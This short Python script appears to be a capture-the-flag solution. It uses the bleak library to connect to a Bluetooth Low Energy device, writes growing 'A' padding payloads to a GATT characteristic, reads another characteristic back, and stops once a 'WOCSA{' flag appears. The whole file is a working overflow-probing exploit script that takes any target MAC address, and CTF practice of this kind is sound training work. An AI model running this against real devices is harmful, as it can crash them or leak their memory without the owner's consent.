import asyncio
from bleak import BleakClient

MAC = input("Enter target MAC address: ")
INPUT_UUID  = "30766572-666c-3077-0001-00805f9b34fb"
OUTPUT_UUID = "30766572-666c-3077-0002-00805f9b34fb"

async def main():
    async with BleakClient(MAC) as client:
        for size in [5, 10, 20, 30, 40, 50, 51, 60, 100]:
            payload = b"A" * size
            print(f"[*] Writing {size} bytes...")
            await client.write_gatt_char(INPUT_UUID, payload)

            output = await client.read_gatt_char(OUTPUT_UUID)
            decoded = output.decode("utf-8", errors="ignore")
            print(f"    Output ({len(output)} bytes): {decoded[:60]}")

            if "WOCSA{" in decoded:
                print(f"\n[!!!] FLAG FOUND: {decoded}")
                break

asyncio.run(main())
